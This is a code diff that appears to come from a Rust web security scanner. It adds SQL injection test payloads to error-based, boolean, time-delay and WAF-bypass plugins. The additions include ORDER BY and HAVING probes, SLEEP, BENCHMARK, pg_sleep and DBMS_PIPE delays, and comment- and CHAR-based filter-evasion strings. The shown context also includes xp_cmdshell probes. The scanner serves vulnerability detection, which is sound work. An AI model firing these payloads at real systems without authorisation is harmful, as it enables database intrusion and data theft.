@@ -90,6 +90,14 @@ impl ScanPlugin for SqliErrorPlugin {
             ),
             // Extended triggers (DB-specific error strings only).
             ("1/0", &["division by zero", "ORA-01476"]),
+            (
+                "' ORDER BY 1-- -",
+                &["unknown column", "order by", "invalid column", "ORA-"],
+            ),
+            (
+                "' HAVING 1=1-- -",
+                &["group", "having", "unknown column", "ORA-"],
+            ),
             ("1 EXEC xp_", &["xp_cmdshell", "xp_regread", "xp_enumdsn"]),
             (
                 r#"' AND extractvalue(1,concat(0x7e,version()))-- -"#,
@@ -155,6 +163,12 @@ impl ScanPlugin for SqliBooleanPlugin {
             ("1' AND '1'='1", "1' AND '1'='2"),
             ("1 AND 1=1-- -", "1 AND 1=2-- -"),
             ("' OR 1=1-- -", "' OR 1=2-- -"),
+            ("1 AND IF(1=1,1,0)", "1 AND IF(1=2,1,0)"),
+            (
+                "1 AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1",
+                "1 AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1",
+            ),
+            ("1 AND IIF(1=1,1,0)=1", "1 AND IIF(1=2,1,0)=1"),
             // MySQL specific
             ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=0"),
             // PG
@@ -267,6 +281,10 @@ impl ScanPlugin for SqliTimePlugin {
             // MySQL
             (&format!("' AND SLEEP({})-- -", SLEEP_SECS), "MySQL"),
             (&format!("1 AND SLEEP({})", SLEEP_SECS), "MySQL"),
+            (
+                &format!("1 AND BENCHMARK({},MD5(1))", SLEEP_SECS * 200_000),
+                "MySQL",
+            ),
             // PostgreSQL
             (
                 &format!("'; SELECT pg_sleep({})-- -", SLEEP_SECS),
@@ -279,6 +297,18 @@ impl ScanPlugin for SqliTimePlugin {
                 "MSSQL",
             ),
             (&format!("1; WAITFOR DELAY '0:0:{}'", SLEEP_SECS), "MSSQL"),
+            (
+                &format!("' OR IF(1=1,SLEEP({}),0)-- -", SLEEP_SECS),
+                "MySQL IF",
+            ),
+            (
+                "' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END-- -",
+                "PostgreSQL CASE",
+            ),
+            (
+                "' OR DBMS_PIPE.RECEIVE_MESSAGE('RZ',5)=0-- -",
+                "Oracle dbms_pipe",
+            ),
             // Oracle (heavy CPU, no sleep — but detectable via heavy query)
             (
                 "1 AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<100000)",
@@ -706,7 +736,9 @@ impl ScanPlugin for SqliWafBypassPlugin {
         // generic words like "error"/"syntax" are never used as a signal.
         let payloads: &[&str] = &[
             "'/**/OR/**/1=1-- -",
+            "' # OR 1=1#",
             "'/*!50000OR*/1=1-- -",
+            "/*!80027 1*/",
             "' oR '1'='1'-- -",
             "%27%20OR%201%3D1-- -",
             "'\x00 OR 1=1-- -",
@@ -714,6 +746,8 @@ impl ScanPlugin for SqliWafBypassPlugin {
             "'\nOR\n1=1-- -",
             "1e0 UNION SELECT 1-- -",
             "' OR 0x313d31-- -",
+            "' OR CHAR(49)=CHAR(49)-- -",
+            "' OR CONCAT('a','b')='ab'-- -",
             "' /*!UNION*/ SELECT 1-- -",
         ];
 
